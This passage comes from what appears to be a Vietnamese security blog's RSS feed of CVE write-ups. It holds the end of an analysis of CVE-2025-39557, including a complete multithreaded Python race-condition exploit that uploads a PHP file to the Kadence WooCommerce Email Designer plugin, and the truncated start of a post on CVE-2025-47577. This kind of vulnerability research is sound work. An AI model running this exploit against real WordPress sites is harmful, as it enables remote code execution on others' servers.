POST (kt-woomail-import &amp;#43; kadence-woomail-import-file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_handle_upload($_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides) called&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;File written to /wp-content/uploads/year/month/filename&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;file_exists($file[&amp;#39;file&amp;#39;]) ‚Üí file_get_contents($file[&amp;#39;file&amp;#39;])&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode($raw) ‚Äî attempt parse as JSON&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;If JSON invalid ‚Üí base64_decode($raw) ‚Üí unserialize()/mb_unserialize()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Process/import template data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;unlink($file[&amp;#39;file&amp;#39;]) ‚Äî delete uploaded file&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File removed from filesystem&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o script ch·∫°y song song gi·ªØ upload v√† ƒë·ªçc&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;import requests&#xA;from concurrent.futures import ThreadPoolExecutor&#xA;from datetime import datetime&#xA;import threading&#xA;&#xA;proxies = {&#xA;    &amp;#34;http&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;,&#xA;    &amp;#34;https&amp;#34;: &amp;#34;127.0.0.1:8080&amp;#34;&#xA;}&#xA;&#xA;headers = {&#xA;    &amp;#34;User-Agent&amp;#34;: &amp;#34;curl/8.14.1&amp;#34;,&#xA;    &amp;#34;Accept&amp;#34;: &amp;#34;*/*&amp;#34;,&#xA;    &amp;#34;Connection&amp;#34;: &amp;#34;keep-alive&amp;#34;,&#xA;    &amp;#34;Cookie&amp;#34;: (&#xA;        &amp;#34;wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7Ca49c2954010c0eed18aa2f49d261d70770dcf11a5cef221c9d43e56ed432f582; &amp;#34;&#xA;        &amp;#34;wordpress_test_cookie=WP%20Cookie%20check; &amp;#34;&#xA;        &amp;#34;wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1762274887%7Chr4bin8jsMpo40hHg8Ur3qVNiF2OrE8mhxy9mPjA4UV%7C514daa3c360a345b63ade229b137259ed3eed64ed9a7d2ac6679bb64774956be; &amp;#34;&#xA;        &amp;#34;mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D&amp;#34;&#xA;    )&#xA;}&#xA;&#xA;php_payload = &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;&#xA;&#xA;upload_url = &amp;#34;http://localhost/wp-admin/customize.php?kt-woomail-customize=1&amp;#34;&#xA;check_url = &amp;#34;http://localhost/wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&amp;lt;filename&amp;gt;.php&amp;#34;&#xA;&#xA;UPLOAD_THREADS = 40&#xA;CHECK_THREADS = 40&#xA;&#xA;upload_success_detected = threading.Event()&#xA;&#xA;def upload_worker(_):&#xA;    session = requests.Session()&#xA;    session.headers.update(headers)&#xA;    session.verify = False&#xA;&#xA;    files = {&#xA;        &amp;#39;kt-woomail-import&amp;#39;: (None, &amp;#39;5afa8d8781&amp;#39;),&#xA;        &amp;#39;kadence-woomail-import-file&amp;#39;: (&amp;#39;&amp;lt;filename&amp;gt;.php&amp;#39;, php_payload, &amp;#39;application/octet-stream&amp;#39;)&#xA;    }&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.post(&#xA;                upload_url,&#xA;                files=files,&#xA;                timeout=10&#xA;            )&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if 200 &amp;lt;= response.status_code &amp;lt; 300:&#xA;                print(f&amp;#34;\033[92m[{ts}] [UPLOAD] Sent | 200 OK\033[0m&amp;#34;)&#xA;            else:&#xA;                print(f&amp;#34;\033[93m[{ts}] [UPLOAD] Failed | {response.status_code}\033[0m&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;\033[91m[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [UPLOAD ERROR] {e}\033[0m&amp;#34;)&#xA;&#xA;def check_worker(_):&#xA;    session = requests.Session()&#xA;    session.proxies.update(proxies)&#xA;    session.verify = False&#xA;&#xA;    while not upload_success_detected.is_set():&#xA;        try:&#xA;            response = session.get(check_url, timeout=8)&#xA;&#xA;            ts = datetime.now().strftime(&amp;#34;%H:%M:%S&amp;#34;)&#xA;            if response.status_code == 200 and len(response.text) &amp;gt; 0:&#xA;                print(f&amp;#34;\n\033[101m[{ts}] [RCE DETECTED!] File uploaded &amp;amp; executed!\033[0m&amp;#34;)&#xA;                upload_success_detected.set()&#xA;                break&#xA;            else:&#xA;                print(f&amp;#34;[{ts}] [CHECK] {response.status_code} | Not found yet...&amp;#34;)&#xA;&#xA;        except Exception as e:&#xA;            print(f&amp;#34;[{datetime.now().strftime(&amp;#39;%H:%M:%S&amp;#39;)}] [CHECK ERROR] {e}&amp;#34;)&#xA;&#xA;if __name__ == &amp;#34;__main__&amp;#34;:&#xA;    print(&amp;#34;\033[96m&amp;#34; &amp;#43; &amp;#34;=&amp;#34;*60)&#xA;    print(&amp;#34;   WORDPRESS KADENCE WOOMAIL UPLOAD EXPLOIT&amp;#34;)&#xA;    print(&amp;#34;   Upload &amp;#43; Auto Check Parallel Threads&amp;#34;)&#xA;    print(&amp;#34;=&amp;#34;*60 &amp;#43; &amp;#34;\033[0m&amp;#34;)&#xA;    print(f&amp;#34;[*] Upload URL : {upload_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Check URL  : {check_url}&amp;#34;)&#xA;    print(f&amp;#34;[*] Threads    : {UPLOAD_THREADS} (upload) &amp;#43; {CHECK_THREADS} (check)&amp;#34;)&#xA;    print(&amp;#34;[*] Press Ctrl&amp;#43;C to stop\n&amp;#34;)&#xA;&#xA;    try:&#xA;        with ThreadPoolExecutor(max_workers=UPLOAD_THREADS &amp;#43; CHECK_THREADS) as executor:&#xA;            upload_futures = [executor.submit(upload_worker, i) for i in range(UPLOAD_THREADS)]&#xA;            &#xA;            check_futures = [executor.submit(check_worker, i) for i in range(CHECK_THREADS)]&#xA;            &#xA;            upload_success_detected.wait()&#xA;&#xA;    except KeyboardInterrupt:&#xA;        print(&amp;#34;\n\033[93m[!] Stopped by user.\033[0m&amp;#34;)&#xA;    finally:&#xA;        upload_success_detected.set() &#xA;        print(&amp;#34;\033[91m[!] All threads terminated.\033[0m&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Script n√†y s·∫Ω th·ª±c hi·ªán vi·ªác ƒë·ªìng th·ªùi upload v√† check file ƒë√£ upload, ch·ªâ khi check ƒë∆∞·ª£c (&lt;code&gt;status=200&lt;/code&gt;) th√¨ m·ªõi d·ª´ng l·∫°i&lt;/li&gt;&#xA;&lt;li&gt;Ch·ª©c nƒÉng check s·∫Ω ƒëi qua proxy c·ªßa BurpSuite ƒë·ªÉ quan s√°t d·ªØ li·ªáu tr·∫£ v·ªÅ v√† filter d·ªÖ d√†ng qua status code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;L·∫•y cookie v√† nonce th√™m v√†o script&lt;/li&gt;&#xA;&lt;li&gt;M·ªü BurpSuite ƒë·ªÉ quan s√°t request v√† response c·ªßa script ƒëi qua.&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫°y script&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;python3 -m venv venv &#xA;source venv/bin/active&#xA;&#xA;pip install requests&#xA;python script.py&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Tr√™n Terminal&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; title=&#34;K·∫øt qu·∫£ tr√™n terminal&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_terminal.png&#34; data-sub-html=&#34;&lt;h2&gt;Result Terminal&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£ tr√™n terminal&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_terminal.png&#39; alt=&#34;Result Terminal&#34; height=&#34;290&#34; width=&#34;647&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£ tr√™n terminal&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr√™n BurpSuite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; title=&#34;K·∫øt qu·∫£ tr√™n BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/result_burp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result BurpSuite&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£ tr√™n BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/result_burp.png&#39; alt=&#34;Result BurpSuite&#34; height=&#34;813&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£ tr√™n BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do plugin b·ªè qua ki·ªÉm tra MIME (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;) khi upload, cho ph√©p t·∫£i l√™n file &lt;code&gt;.php&lt;/code&gt;. File b·ªã x√≥a ngay sau x·ª≠ l√Ω, nh∆∞ng t·ªìn t·∫°i ng·∫Øn ƒë·ªß ƒë·ªÉ khai th√°c qua &lt;strong&gt;race condition&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: thi·∫øu ki·ªÉm tra MIME + l∆∞u file t·∫°m trong th∆∞ m·ª•c public.&lt;/li&gt;&#xA;&lt;li&gt;ƒê√£ v√° ·ªü b·∫£n &lt;strong&gt;1.5.15&lt;/strong&gt; (&lt;code&gt;test_type =&amp;gt; true&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£i ph√°p: lu√¥n x√°c th·ª±c MIME, tr√°nh l∆∞u file th·ª±c thi v√†o th∆∞ m·ª•c public.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Upload via Race Condition&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/kadence-woocommerce-email-designer/vulnerability/wordpress-kadence-woocommerce-email-designer-plugin-1-5-14-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin &amp;lt;= 1.5.14 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47577 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-07-cve-2025-47577/</link>
      <pubDate>Fri, 07 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-07-cve-2025-47577/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;&amp;ldquo;Unrestricted Upload of File with Dangerous Type&amp;rdquo;&lt;/strong&gt; trong &lt;strong&gt;TemplateInvaders TI WooCommerce Wishlist&lt;/strong&gt; cho ph√©p t·∫£i l√™n &lt;strong&gt;Web Shell&lt;/strong&gt; l√™n m√°y ch·ªß web. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;before 2.10.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47577&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47577&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.10.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ti-woocommerce-wishlist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;TI WooCommerce Wishlist&lt;/strong&gt;: &lt;strong&gt;2.9.2&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.10.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wc-fields-factory/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WC Fields Factory&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = 